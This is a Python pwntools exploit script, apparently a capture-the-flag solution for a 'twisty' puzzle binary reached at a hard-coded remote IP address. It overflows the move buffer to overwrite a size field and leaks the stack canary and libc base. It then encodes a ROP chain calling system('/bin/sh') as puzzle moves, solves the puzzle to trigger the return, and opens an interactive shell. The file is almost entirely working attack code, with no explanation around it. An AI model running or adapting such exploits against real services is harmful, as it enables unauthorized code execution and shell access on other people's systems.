from pwn import *
import sys

class Board(object):
  def __init__(self, layout):
    self.board = layout
    self.init = ["ABCD","EFGH","IJKL","MNOP"]
    self.size = 4
    self.moves = []

  def print_(self):
    for row in self.board:
      print(row)

  def reset(self):
    goalr, goalc = 0, 0

    while True:
      letter = self.init[goalr][goalc]
      rdx, cdx = self.find(letter)
      self.move(rdx, cdx, goalr, goalc)
      goalr, goalc = self.increment(goalr, goalc)
      if goalr == self.size-1 and goalc == 1:
        break

  def increment(self, goalr, goalc):
    goalc += 1
    if goalc == self.size:
      goalc = 0
      goalr += 1
    return goalr, goalc

  def LX(self, rdx, cdx):
    row = self.board[rdx]
    self.board[rdx] = row[1:] + [row[0]]
    self.moves.append('r%sl'%str(rdx))
    cdx -= 1
    if cdx < 0:
      cdx = self.size -  1
    return cdx

  def RX(self, rdx, cdx):
    row = self.board[rdx]
    self.board[rdx] = [row[-1]] + row[0:-1]
    self.moves.append('r%sr'%str(rdx))
    cdx += 1
    if cdx == self.size:
      cdx = 0
    return cdx

  def UX(self, cdx, rdx):
    last = self.board[0][cdx]
    for r in range(0, self.size)[::-1]:
      tmp = self.board[r][cdx]
      self.board[r][cdx] = last
      last = tmp
    self.moves.append('c%su'%str(cdx))
    rdx -= 1
    if rdx < 0:
      rdx = self.size - 1
    return rdx

  def DX(self, cdx, rdx):
    last = self.board[self.size-1][cdx]
    for r in range(0, self.size):
      tmp = self.board[r][cdx]
      self.board[r][cdx] = last
      last = tmp
    self.moves.append('c%sd'%str(cdx))
    rdx += 1
    if rdx == self.size:
      rdx = 0
    return rdx

  def move(self, rdx, cdx, goalr, goalc):
    if rdx == goalr and cdx == goalc:
      return

    if rdx == goalr and goalc == 0:
      while cdx > 0:
        cdx = self.LX(rdx, cdx)
      return

    if rdx == goalr:
      rdx = self.DX(cdx, rdx)
      origc = cdx
      cdx = self.LX(rdx, cdx)
      self.UX(origc, rdx)
    if goalc == self.size - 1:
      while cdx > 0:
        cdx = self.LX(rdx, cdx)
    else:
      while cdx <= goalc:
        cdx = self.RX(rdx, cdx)
      while cdx > goalc + 1:
        cdx = self.LX(rdx, cdx)

    times = 0
    for i in range(goalr, rdx):
      times += 1
      self.DX(goalc, rdx)

    cdx = self.LX(rdx, cdx)

    for i in range(0, times):
      rdx = self.UX(cdx, rdx)

  def find(self, letter):
    for rdx in range(0, len(self.board)):
      row = self.board[rdx]
      for cdx in range(0, len(row)):
        if row[cdx] == letter:
          return (rdx, cdx)
    raise Exception("letter not found")

def parseBoard():
	res = p.recvuntil('> ').split('\n')[:4]
	for i in range(4):
		res[i] = list(res[i])
	return res

#p = process('./twisty')
p = remote('138.68.67.161', 20007)
e = ELF('./twisty')
l = e.libc

#context.log_level = 'debug'

dic = {
	0x0:'c0u',
	0x1:'c1u',
	0x2:'c2u',
	0x3:'c3u',
	0x4:'c0d',
	0x5:'c1d',
	0x6:'c2d',
	0x7:'c3d',
	0xc:'r0l',
	0xd:'r1l',
	0xe:'r2l',
	0xf:'r3l',
	0x8:'r0r',
	0x9:'r1r',
	0xa:'r2r',
	0xb:'r3r',
}

def go(pay):
	p.sendlineafter('>', pay)

def encode(pay):
	global dic
	li = list(pay)
	res =''
	for byte in li:
		first = (ord(byte) & 0xf0) >>4
		second = ord(byte) & 0x0f
		res += dic[first]+'\n'+dic[second]+'\n'
	return res

def decode(pay):
	global dic
	li = pay.split(' ')[:-1]
	print li
	print 'LEN : ' + str(len(li))
	res = ''
	turn = 0
	for byte in li:
		if turn%2==0:
			first = dic.keys()[dic.values().index(byte)]
			first <<= 4
		else:
			second = dic.keys()[dic.values().index(byte)]
			res += chr(first+second)
		turn += 1
	return res

go('r0r\nr0l\n'*2048)

go('r3l') # overwrite size
go('l')
p.recvuntil('r3l ')

get = 'c0u '+p.recv(4*200)
leak = decode(get)

print hexdump(leak)
canary = u64(leak[0x10:0x18])
libc = u64(leak[0x50:0x58]) - 0x20830
print 'CANARY : ' + hex(canary)
print 'LIBC   : ' + hex(libc)

go('u\n'*0x51) # goes up

go(encode(p64(libc+0x21102))) # pop rdi; ret;
go(encode(p64(libc+next(l.search('/bin/sh')))))
go(encode(p64(libc+l.sym['system'])))

for i in range(0x70+13):
	p.recvuntil('> ') # set buffer

cur = parseBoard()
board = Board(cur)
board.print_()
board.reset()
final = ''.join(i+'\n' for i in board.moves)
print final # commands to solve the puzzle

if board.board[3]!=['M', 'N', 'O', 'P']: # sometimes solver fails
	print 'Fail'
	sys.exit(1)

board.print_()
p.sendline(final)

p.interactive()
